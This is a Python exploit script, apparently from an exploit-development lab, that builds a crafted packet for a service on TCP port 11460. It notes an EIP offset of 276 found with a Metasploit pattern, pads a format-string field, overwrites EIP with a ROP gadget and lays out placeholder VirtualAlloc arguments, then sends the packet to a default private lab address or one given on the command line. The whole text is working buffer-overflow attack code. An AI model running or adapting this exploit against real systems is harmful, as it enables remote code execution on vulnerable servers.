#!/usr/bin/env python3

import socket
import sys
import subprocess
from struct import pack

# Results
# eip=41326a41
# pattern = 41 6a 32 41 = Aj2A
# $ msf-pattern_offset -q Aj2A -l 0x200
# [*] Exact match at offset 276

# eip offset: 276
# esp offset: 280

eip_offset = 276
command_buffer_length = 0x400

# psAgentCommand
buf = bytearray([0x41] * 0xC)
buf += pack("<i", 0x534)  # opcode
buf += pack("<i", 0x0)  # 1st memcpy: offset
buf += pack("<i", 0x500)  # 1st memcpy: size field
buf += pack("<i", 0x0)  # 2nd memcpy: offset
buf += pack("<i", 0x100)  # 2nd memcpy: size field
buf += pack("<i", 0x0)  # 3rd memcpy: offset
buf += pack("<i", 0x100)  # 3rd memcpy: size field
buf += bytearray([0x41] * 0x8)

# psCommandBuffer
va = pack("<L", 0x45454545)  # dummy VirutalAlloc Address
va += pack("<L", 0x46464646)  # Shellcode Return Address
va += pack("<L", 0x47474747)  # dummy Shellcode Address
va += pack("<L", 0x48484848)  # dummy dwSize
va += pack("<L", 0x49494949)  # dummy flAllocationType
va += pack("<L", 0x51515151)  # dummy flProtect

offset = b"\x90" * (276 - len(va))
eip = pack("<i", 0x50501110) # 0x50501110: push esp ; push eax ; pop edi ; pop esi ; ret  ; -> mov esi, esp AKA Move the contents of esp into esi.
rop = b"\x45" * (command_buffer_length - eip_offset - 4)

payload = offset + va + eip + rop
formatString = b"File: %s From: %d To: %d ChunkLoc: %d FileLoc: %d" % (payload, 0, 0, 0, 0)
buf += formatString

# Checksum
buf = pack(">i", len(buf) - 4) + buf


def main():
    server = "192.168.185.10"
    if len(sys.argv) >= 2:
        server = sys.argv[1]

    port = 11460

    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect((server, port))

    s.send(buf)
    s.close()

    print("[+] Packet sent")
    sys.exit(0)


if __name__ == "__main__":
    main()